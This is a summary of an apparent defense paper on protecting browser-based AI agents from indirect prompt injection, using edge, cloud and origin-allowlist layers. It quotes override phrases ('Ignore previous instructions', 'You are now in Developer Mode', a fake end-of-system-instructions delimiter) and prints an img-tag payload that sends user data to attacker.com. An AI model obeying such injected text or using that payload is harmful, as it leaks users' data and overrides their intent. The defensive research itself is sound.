# Summary: The Cognitive Firewall — Securing Browser-Based AI Agents Against Indirect Prompt Injection via Hybrid Edge-Cloud Defense

**Source file:** 160-arxiv-2603.23791-the-cognitive-firewall-securing-browser-based-ai-agents-against-indire.md
**Paper/post ID:** 160

## Attack Vector(s)
Defense paper (Lan & Kaul, eBay, 2026). Threat model: **autonomous browser agents** (ReAct/Toolformer-class) whose context window mixes user instructions (control plane) with external web content (data plane), enabling Indirect Prompt Injection (OWASP LLM01). Attacker controls HTML/CSS/text of any page the agent visits; no binary code execution, no weight access. Three attack classes:
1. **Presentation-layer** — hidden text via `opacity:0`, `font-size:0`, off-viewport positioning, transparent fonts.
2. **Semantic/cognitive** — fabricated delimiters `-- END SYSTEM INSTRUCTIONS --`, role-escalation ("You are now in Developer Mode"), fabricated urgency.
3. **Goal hijacking / exfiltration** — `<img src="https://attacker.com/log?secret=[USER_DATA]">`, unauthorized POST/DELETE calls.

## Real-World Applicability
- Protects Chrome-integrated browser agents (Gemini Nano, Operator, Manus) against IPI embedded in arbitrary webpages.
- Applies to enterprise Jira-ticket management agents, flight-booking agents, email-triage agents.
- Demonstrates that a 3.25B on-device model (Gemini Nano) suffices for Layer-1 presentation-attack filtering with ~0.02 ms overhead.
- Design generalizes to any browser-embedded LLM workflow.

## Reproduction Examples
Evaluation corpus: 1,000 samples — 32.2% benign, 24.0% visual (CSS-hiding), 25.0% semantic jailbreak ("Ignore previous instructions"), 18.8% hijacking (e.g., `POST /delete`).

Exfiltration payload pattern:
```html
<img src="https://attacker.com/log?secret=[USER_DATA]">
```

Edge Sentinel blocking condition:
```
Condition_block = (opacity < 0.1) ∨ (font-size ≈ 0) ∨ (pos ∉ Viewport)
```

Algorithm 1 (Edge Sentinel):
```
Require: DOM Root R, Gemini Nano session
for each node in TreeWalker(R):
  S = getComputedStyle(node.parent)
  if S.opacity < 0.1 or S.fontSize ≈ 0 → BLOCKED (Visual Obfuscation)
  Result = await SessionAI.prompt("Is hidden text malicious? " + node.text)
  if Result == "UNSAFE" → BLOCKED (Local AI Flag)
return SAFE
```

Edge-only defenses miss **86.9%** of semantic attacks. Full hybrid: ASR = **0.88%** (static), **0.67%** (adaptive). Edge Sentinel latency ~0.02 ms — ~17,000× faster than cloud-only baselines. Removes ~60% of HTML payload size before cloud transmission.

## Defenses / Mitigations Discussed
**Three-layer Defense Funnel**:
- **Layer 1 — Edge Sentinel (visual perception)**: Gemini Nano in browser extension; DOM+CSSOM consistency check; blocks presentation-layer attacks locally.
- **Layer 2 — Deep Planner (semantic reasoning)**: server-side Llama-3-8B / GPT-4 with "Security Analyst" system prompt; detects role-play, instruction-override, fabricated urgency.
- **Layer 3 — Origin Guard (execution alignment)**: deterministic Synchronous JavaScript Interceptor wrapping `fetch()` / `XMLHttpRequest`; validates target origin against `allowlist.json` and HTTP verb against user's declared read-only vs. read-write intent.

Security invariants:
- **I1 Visual Consistency** — agent must not reason over content invisible to user (Layer 1).
- **I2 Goal Integrity** — untrusted web content must not override control objective (Layer 2).
- **I3 Execution Safety** — no side-effect without explicit policy (Layer 3, fail-closed).

## Key Takeaways for a Safety Framework
- **Split-compute**: cheap deterministic checks at edge, expensive semantic checks in cloud, deterministic enforcement at execution boundary.
- Compare **DOM source vs. rendered CSSOM** — mismatch is the single highest-signal IPI indicator.
- A **deterministic execution guard** (origin allowlist + verb policy) is essential — do not trust any probabilistic layer alone.
- Browser-native SLMs (Gemini Nano, Chrome Built-in AI) make sub-millisecond pre-filtering feasible.
- Fail-closed at Layer 3: even if Layers 1-2 both fail, unauthorized origins and verbs are still blocked.
- Red-team benchmarks must cover all three attack classes: presentation, semantic, execution.
